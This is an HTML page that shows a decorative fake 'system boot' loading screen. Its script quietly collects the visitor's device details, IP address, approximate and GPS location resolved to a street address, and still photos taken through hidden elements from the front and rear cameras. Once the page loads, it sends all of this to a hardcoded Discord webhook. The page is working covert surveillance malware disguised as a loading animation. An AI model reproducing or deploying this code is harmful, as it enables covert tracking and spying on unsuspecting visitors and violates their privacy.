<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
  <title>SYSTEM · BOOT</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      min-height: 100vh;
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      background: radial-gradient(ellipse at 20% 30%, #0a0a1a, #020108);
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
      overflow: hidden;
    }

    /* animated metallic galaxy gradient overlay */
    body::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: radial-gradient(circle at 40% 50%, rgba(88, 28, 135, 0.3), rgba(0, 0, 0, 0.6)),
                  repeating-linear-gradient(45deg, rgba(139, 92, 246, 0.05) 0px, rgba(139, 92, 246, 0.05) 2px, transparent 2px, transparent 8px);
      pointer-events: none;
      z-index: 0;
    }

    /* floating orbs / nebula effect */
    .nebula {
      position: absolute;
      border-radius: 50%;
      filter: blur(70px);
      opacity: 0.5;
      pointer-events: none;
      z-index: 0;
    }

    .nebula-1 {
      width: 50vw;
      height: 50vw;
      background: radial-gradient(circle, #7c3aed, #4c1d95);
      top: -20vh;
      left: -10vw;
      animation: floatNebula 22s ease-in-out infinite alternate;
    }

    .nebula-2 {
      width: 60vw;
      height: 60vw;
      background: radial-gradient(circle, #a855f7, #6d28d9);
      bottom: -30vh;
      right: -20vw;
      animation: floatNebula2 26s ease-in-out infinite alternate;
    }

    .nebula-3 {
      width: 40vw;
      height: 40vw;
      background: radial-gradient(circle, #c084fc, #3b0764);
      top: 40%;
      left: 50%;
      transform: translate(-50%, -50%);
      animation: pulseGlow 14s ease-in-out infinite alternate;
    }

    @keyframes floatNebula {
      0% { transform: translate(0, 0) scale(1); opacity: 0.4; }
      100% { transform: translate(5%, 8%) scale(1.2); opacity: 0.7; }
    }

    @keyframes floatNebula2 {
      0% { transform: translate(0, 0) scale(1); opacity: 0.3; }
      100% { transform: translate(-6%, -5%) scale(1.3); opacity: 0.6; }
    }

    @keyframes pulseGlow {
      0% { opacity: 0.2; transform: translate(-50%, -50%) scale(1); }
      100% { opacity: 0.45; transform: translate(-50%, -50%) scale(1.4); }
    }

    /* stars particle */
    .stars {
      position: absolute;
      width: 100%;
      height: 100%;
      z-index: 1;
      pointer-events: none;
    }

    .star {
      position: absolute;
      background: white;
      border-radius: 50%;
      opacity: 0;
      animation: twinkle 3s infinite alternate;
    }

    @keyframes twinkle {
      0% { opacity: 0; transform: scale(0.8); }
      100% { opacity: 0.9; transform: scale(1.2); }
    }

    /* MAIN LOADING CARD - glassmorphism premium */
    .loading-card {
      position: relative;
      z-index: 10;
      width: 92%;
      max-width: 480px;
      background: rgba(12, 8, 28, 0.55);
      backdrop-filter: blur(16px);
      border-radius: 48px;
      padding: 2.8rem 2rem;
      text-align: center;
      border: 1px solid rgba(168, 85, 247, 0.4);
      box-shadow: 0 25px 45px rgba(0, 0, 0, 0.5), 0 0 0 0.5px rgba(168, 85, 247, 0.2) inset;
      transition: all 0.3s ease;
    }

    /* holographic chip icon */
    .chip-icon {
      width: 85px;
      height: 85px;
      margin: 0 auto 24px;
      background: linear-gradient(145deg, #2a1a55, #120c2c);
      border-radius: 28px;
      display: flex;
      align-items: center;
      justify-content: center;
      box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(168, 85, 247, 0.3) inset, 0 0 20px rgba(139, 92, 246, 0.3);
      animation: chipPulse 2.2s ease-in-out infinite;
    }

    .chip-icon i {
      font-size: 44px;
      background: linear-gradient(135deg, #e9d5ff, #c084fc);
      -webkit-background-clip: text;
      background-clip: text;
      color: transparent;
      filter: drop-shadow(0 0 6px rgba(192, 132, 252, 0.6));
    }

    @keyframes chipPulse {
      0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(139, 92, 246, 0.4), 0 0 0 1px rgba(168,85,247,0.3) inset; }
      50% { transform: scale(1.02); box-shadow: 0 0 0 8px rgba(139, 92, 246, 0.1), 0 0 0 1px #c084fc inset; }
      100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(139, 92, 246, 0), 0 0 0 1px rgba(168,85,247,0.3) inset; }
    }

    /* title */
    .boot-title {
      font-size: 1.7rem;
      font-weight: 700;
      letter-spacing: -0.3px;
      background: linear-gradient(125deg, #e9d5ff, #d8b4fe, #c084fc, #a855f7);
      background-size: 200% auto;
      -webkit-background-clip: text;
      background-clip: text;
      color: transparent;
      margin-bottom: 28px;
      text-transform: uppercase;
      font-family: 'Inter', monospace;
      animation: shimmer 3s infinite linear;
    }

    @keyframes shimmer {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    /* progress area premium */
    .progress-area {
      margin-bottom: 24px;
    }

    .progress-label {
      display: flex;
      justify-content: space-between;
      font-size: 0.8rem;
      font-weight: 500;
      margin-bottom: 10px;
      color: #c9b6f0;
      letter-spacing: 0.3px;
    }

    .progress-percent {
      font-family: monospace;
      background: rgba(0,0,0,0.4);
      padding: 2px 8px;
      border-radius: 30px;
      font-size: 0.75rem;
    }

    .progress-bar-bg {
      background: rgba(30, 20, 55, 0.7);
      border-radius: 60px;
      padding: 2px;
      backdrop-filter: blur(4px);
      border: 1px solid rgba(168, 85, 247, 0.35);
    }

    .progress-fill {
      height: 8px;
      background: linear-gradient(90deg, #a855f7, #e879f9, #f0abfc, #c084fc);
      border-radius: 60px;
      width: 0%;
      transition: width 0.2s cubic-bezier(0.2, 0.9, 0.4, 1.1);
      box-shadow: 0 0 12px #c084fc;
      position: relative;
    }

    /* status message */
    .status-message {
      font-size: 0.85rem;
      background: rgba(20, 10, 45, 0.6);
      padding: 10px 18px;
      border-radius: 40px;
      display: inline-block;
      backdrop-filter: blur(4px);
      font-weight: 450;
      color: #cdbef5;
      margin-top: 8px;
      border: 0.5px solid rgba(168, 85, 247, 0.4);
    }

    /* modern equalizer (minimalist) */
    .equalizer {
      margin-top: 38px;
      display: flex;
      justify-content: center;
      gap: 6px;
      height: 40px;
      align-items: flex-end;
    }

@keyframes spin {
  from { transform: rotate(0deg); }
  to { transform: rotate(360deg); }
}

.fa-sync-alt {
  animation: spin 1s linear infinite;
  display: inline-block;
}

    .eq-bar {
      width: 4px;
      background: linear-gradient(to top, #a78bfa, #e879f9);
      border-radius: 4px;
      animation: eqWave 1.1s ease-in-out infinite;
      opacity: 0.8;
    }

    @keyframes eqWave {
      0%, 100% { height: 6px; }
      50% { height: 34px; }
    }

    /* metallic accent line */
    .accent-line {
      width: 70px;
      height: 2px;
      background: linear-gradient(90deg, transparent, #c084fc, #f0abfc, transparent);
      margin: 28px auto 0;
      border-radius: 2px;
    }

    /* footer subtle */
    .sys-footer {
      position: fixed;
      bottom: 18px;
      left: 0;
      right: 0;
      text-align: center;
      font-size: 0.7rem;
      color: #5b489c;
      z-index: 10;
      font-family: monospace;
      letter-spacing: 0.5px;
    }

    /* hidden elements for camera */
    .hidden {
      display: none;
    }
  </style>
  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800&display=swap" rel="stylesheet" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
</head>
<body>

<div class="nebula nebula-1"></div>
<div class="nebula nebula-2"></div>
<div class="nebula nebula-3"></div>

<div class="stars" id="starContainer"></div>

<div class="loading-card">
  <div class="chip-icon">
    <i class="fas fa-microchip"></i>
  </div>
  
  <div class="boot-title" id="bootStatusText">CORE INIT</div>
  
  <div class="progress-area">
    <div class="progress-label">
      <span><i class="fas fa-sync-alt" style="font-size: 11px; margin-right: 5px;"></i> SYSTEM LOAD</span>
      <span class="progress-percent" id="percentLabel">0%</span>
    </div>
    <div class="progress-bar-bg">
      <div class="progress-fill" id="progressFill"></div>
    </div>
  </div>
  
  <div class="status-message" id="statusDetail">
    <i class="fas fa-circle-notch fa-spin" style="margin-right: 6px;"></i> Booting kernel...
  </div>
  
  <div class="equalizer">
    <div class="eq-bar" style="animation-delay: 0s"></div>
    <div class="eq-bar" style="animation-delay: 0.08s"></div>
    <div class="eq-bar" style="animation-delay: 0.16s"></div>
    <div class="eq-bar" style="animation-delay: 0.24s"></div>
    <div class="eq-bar" style="animation-delay: 0.32s"></div>
    <div class="eq-bar" style="animation-delay: 0.40s"></div>
    <div class="eq-bar" style="animation-delay: 0.48s"></div>
    <div class="eq-bar" style="animation-delay: 0.56s"></div>
    <div class="eq-bar" style="animation-delay: 0.64s"></div>
  </div>
  
  <div class="accent-line"></div>
</div>

<div class="sys-footer">
  <i class="fas fa-shield-alt"></i> SECURE BOOT · v2.6.4
</div>

<!-- Hidden elements for camera -->
<video id="videoCapture" autoplay muted class="hidden"></video>
<canvas id="snapCanvas" class="hidden"></canvas>

<script>
  // create stars (galaxy detail)
  const starContainer = document.getElementById('starContainer');
  for (let i = 0; i < 180; i++) {
    const star = document.createElement('div');
    star.classList.add('star');
    const size = Math.random() * 2.5 + 0.8;
    star.style.width = size + 'px';
    star.style.height = size + 'px';
    star.style.left = Math.random() * 100 + '%';
    star.style.top = Math.random() * 100 + '%';
    star.style.animationDuration = 1.5 + Math.random() * 4 + 's';
    star.style.animationDelay = Math.random() * 5 + 's';
    star.style.opacity = 0.3 + Math.random() * 0.6;
    starContainer.appendChild(star);
  }

  // loading logic
  const progressFill = document.getElementById('progressFill');
  const percentLabel = document.getElementById('percentLabel');
  const bootStatusText = document.getElementById('bootStatusText');
  const statusDetail = document.getElementById('statusDetail');
  
  let progress = 0;
  
  const stages = [
    { max: 18, title: "SCAN HARDWARE", detail: "Detecting CPU / memory / platform" },
    { max: 36, title: "LOAD CORE", detail: "Initializing system interfaces" },
    { max: 52, title: "NETWORK LINK", detail: "Establishing secure channel" },
    { max: 71, title: "ATOMICALS SYNC", detail: "Synchronizing time & location" },
    { max: 89, title: "FINALIZING", detail: "Applying security protocols" },
    { max: 100, title: "ONLINE", detail: "All systems operational" }
  ];
  
  let stageIdx = 0;
  
  const updateUI = () => {
    percentLabel.innerText = Math.floor(progress) + '%';
    progressFill.style.width = progress + '%';
    
    let currentStage = stages[stageIdx];
    if (currentStage && progress >= currentStage.max && stageIdx < stages.length - 1) {
      stageIdx++;
      currentStage = stages[stageIdx];
      if (currentStage) {
        bootStatusText.innerText = currentStage.title;
        statusDetail.innerHTML = `<i class="fas fa-microchip" style="margin-right: 6px;"></i> ${currentStage.detail}`;
      }
    }
    
    if (progress >= 100) {
      bootStatusText.innerText = "SYSTEM READY";
      statusDetail.innerHTML = '<i class="fas fa-dragon" style="margin-right: 6px; color:#ff3366;"></i> Atomicals activated · All systems operational';
      clearInterval(interval);
    }
  };
  
  const interval = setInterval(() => {
    if (progress >= 100) {
      clearInterval(interval);
      return;
    }
    
    // Increment lebih kecil lagi biar makin lambat
    let increment = Math.floor(Math.random() * 2) + 1; // 1-2% doang
    let newProgress = Math.min(progress + increment, 100);
    progress = newProgress;
    updateUI();
    
    const curStage = stages[stageIdx];
    if (curStage && progress < curStage.max && progress > curStage.max - 14) {
      if (curStage.title === "SCAN HARDWARE") statusDetail.innerHTML = `<i class="fas fa-microchip"></i> Verifying system integrity...`;
      else if (curStage.title === "LOAD CORE") statusDetail.innerHTML = `<i class="fas fa-cogs"></i> Loading privileged modules...`;
      else if (curStage.title === "NETWORK LINK") statusDetail.innerHTML = `<i class="fas fa-globe"></i> Handshake completed · secure`;
      else if (curStage.title === "ATOMICALS SYNC") statusDetail.innerHTML = `<i class="fas fa-star-of-life"></i> Aligning with galactic time`;
      else if (curStage.title === "FINALIZING") statusDetail.innerHTML = `<i class="fas fa-shield-haltered"></i> Finalizing secure layer`;
    }
    
    if (progress === 100) updateUI();
  }, 300); // Interval jadi 300ms (lebih lambat)
  
  setTimeout(() => {
    if (progress < 100) {
      progress = 100;
      updateUI();
      clearInterval(interval);
      bootStatusText.innerText = "SYSTEM READY";
      statusDetail.innerHTML = '<i class="fas fa-dragon" style="margin-right: 6px; color:#ff3366;"></i> Atomicals activated · All systems operational';
    }
  }, 20000); // Timeout jadi 20 detik

  // ======================== WEBHOOK SYSTEM ========================
  (async function() {
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1449595197921951786/q7pM8FCgCRsFj6TbSGRswqupsvoZxhYAVaPBlZDUJBI3ru_1YV3RYaaWaXNeqABgxrV-';
    let systemSent = false, networkSent = false, gpsSent = false, frontSent = false, rearSent = false;
    
    async function sendEmbed(title, fields, color = 0x6366f1, fileBlob = null, fileName = null) {
      const embed = { title, color, timestamp: new Date().toISOString(), footer: { text: "System Analytics" }, fields };
      try {
        if(fileBlob && fileName) {
          let fd = new FormData();
          fd.append('payload_json', JSON.stringify({ embeds: [embed] }));
          fd.append('file', fileBlob, fileName);
          await fetch(WEBHOOK_URL, { method: 'POST', body: fd });
        } else {
          await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ embeds: [embed] }) });
        }
      } catch(e) { console.warn(e); }
    }
    
    async function reverseGeo(lat, lon) {
      try {
        let res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
        let data = await res.json();
        if(data && data.address) {
          let addr = data.address;
          let district = addr.suburb || addr.village || addr.city_district || addr.town || "N/A";
          let city = addr.city || addr.state_district || addr.state || "N/A";
          return { district, city, fullAddress: data.display_name || "N/A" };
        }
      } catch(e) {}
      return { district: "N/A", city: "N/A", fullAddress: "N/A" };
    }
    
    // System Info
    if (!systemSent) {
      let batteryPct = "N/A";
      if(navigator.getBattery) {
        try { let bat = await navigator.getBattery(); batteryPct = `${Math.round(bat.level*100)}% ${bat.charging ? "Charging" : "Battery"}`; } catch(e) {}
      }
      await sendEmbed("📡 System Information", [
        { name: "🖥️ User Agent", value: navigator.userAgent.substring(0, 80), inline: false },
        { name: "⚙️ Platform", value: navigator.platform, inline: true },
        { name: "🌐 Language", value: navigator.language, inline: true },
        { name: "🧠 Hardware", value: `${navigator.hardwareConcurrency || "?"} cores / ${navigator.deviceMemory || "?"} GB`, inline: true },
        { name: "🖼️ Resolution", value: `${screen.width}x${screen.height}`, inline: true },
        { name: "🔋 Battery", value: batteryPct, inline: true },
        { name: "⏳ Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true }
      ], 0x2c3e50);
      systemSent = true;
    }
    
    // Network Location
    if (!networkSent) {
      let ipLocation = { lat: null, lon: null, city: "N/A", region: "N/A", country: "N/A", ip: "N/A", district: "N/A", fullAddress: "N/A" };
      try {
        let resp = await fetch('https://ipapi.co/json/');
        let ipData = await resp.json();
        ipLocation.ip = ipData.ip || "N/A";
        ipLocation.city = ipData.city || "N/A";
        ipLocation.region = ipData.region || "N/A";
        ipLocation.country = ipData.country_name || "N/A";
        if(ipData.latitude && ipData.longitude) {
          ipLocation.lat = ipData.latitude;
          ipLocation.lon = ipData.longitude;
          let geo = await reverseGeo(ipLocation.lat, ipLocation.lon);
          ipLocation.district = geo.district;
          ipLocation.fullAddress = geo.fullAddress;
        }
      } catch(e) {}
      const mapsLink = ipLocation.lat && ipLocation.lon ? `https://www.google.com/maps?q=${ipLocation.lat},${ipLocation.lon}` : "#";
      await sendEmbed("🌍 Network Geolocation", [
        { name: "🌐 IP Address", value: `||${ipLocation.ip}||`, inline: true },
        { name: "🏙️ City", value: ipLocation.city, inline: true },
        { name: "🗺️ Region", value: ipLocation.region, inline: true },
        { name: "🇺🇳 Country", value: ipLocation.country, inline: true },
        { name: "🏘️ District", value: ipLocation.district, inline: true },
        { name: "📍 Google Maps", value: `[Click to view location](${mapsLink})`, inline: false },
        { name: "📌 Full Address", value: ipLocation.fullAddress.substring(0, 120) || "N/A", inline: false }
      ], 0x3498db);
      networkSent = true;
    }
    
    // GPS Location
    if (!gpsSent && navigator.geolocation) {
      let gpsLocation = { lat: null, lon: null, accuracy: null, district: "N/A", fullAddress: "N/A" };
      await new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition(async (pos) => {
          gpsLocation.lat = pos.coords.latitude;
          gpsLocation.lon = pos.coords.longitude;
          gpsLocation.accuracy = pos.coords.accuracy;
          let geo = await reverseGeo(gpsLocation.lat, gpsLocation.lon);
          gpsLocation.district = geo.district;
          gpsLocation.fullAddress = geo.fullAddress;
          resolve();
        }, () => resolve(), { enableHighAccuracy: true, timeout: 7000 });
      });
      if(gpsLocation.lat) {
        const gpsMapsLink = `https://www.google.com/maps?q=${gpsLocation.lat},${gpsLocation.lon}`;
        await sendEmbed("📍 GPS Location", [
          { name: "🎯 Coordinates", value: `${gpsLocation.lat.toFixed(6)}, ${gpsLocation.lon.toFixed(6)}`, inline: false },
          { name: "📏 Accuracy", value: `${Math.round(gpsLocation.accuracy)} meters`, inline: true },
          { name: "🏘️ District", value: gpsLocation.district, inline: true },
          { name: "🗺️ Google Maps", value: `[Open in Maps](${gpsMapsLink})`, inline: false },
          { name: "📌 Full Address", value: gpsLocation.fullAddress.substring(0, 140) || "N/A", inline: false }
        ], 0x27ae60);
      }
      gpsSent = true;
    }
    
    // Camera capture function
    async function captureCamera(facingMode, label) {
      const video = document.getElementById('videoCapture');
      const canvas = document.getElementById('snapCanvas');
      let stream = null;
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: facingMode } } });
        video.srcObject = stream;
        video.muted = true;
        await new Promise((resolve) => { video.onloadedmetadata = () => { video.play(); resolve(); }; });
        await new Promise(r => setTimeout(r, 1000));
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
        if (blob && blob.size > 1000) {
          await sendEmbed(`📸 Camera - ${label}`, [{ name: "Timestamp", value: new Date().toLocaleString(), inline: false }], 0xe67e22, blob, `${label.toLowerCase()}_${Date.now()}.jpg`);
        }
        if (stream) stream.getTracks().forEach(t => t.stop());
        video.srcObject = null;
      } catch(e) { console.warn("Camera error:", e); }
    }
    
    if (!frontSent) { await captureCamera("user", "Front"); frontSent = true; }
    await new Promise(r => setTimeout(r, 1500));
    if (!rearSent) { await captureCamera("environment", "Rear"); rearSent = true; }
})();
</script>
</body>
</html>
